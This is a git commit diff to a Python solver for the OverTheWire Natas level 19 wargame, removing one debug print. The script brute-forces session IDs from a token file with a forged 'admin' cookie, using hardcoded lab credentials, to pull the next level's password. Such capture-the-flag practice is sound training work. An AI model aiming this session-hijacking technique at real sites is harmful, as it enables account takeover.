03408685a4b96c42c2e0260afb6fffd5ad037eee
cybersecuritydef <155002701+cybersecuritydef@users.noreply.github.com>
2025-10-01 16:11:51 +0300

    Update natas_19.py

--- wargames/natas_19.py
+++ wargames/natas_19.py
@@ -9,7 +9,6 @@ try:
 	with open("tokens.txt", "r") as f:
 		for session in f:
 			resp = requests.get("http://natas19.natas.labs.overthewire.org/index.php", auth=HTTPBasicAuth("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"), cookies={"PHPSESSID": "{}".format(session.strip()), "admin": "1"})
-			print(session.strip())
 			if "Password: " in resp.text:
 				print(re.search(r'Password: [a-zA-Z0-9]{0,32}', resp.text)[0])
 				break
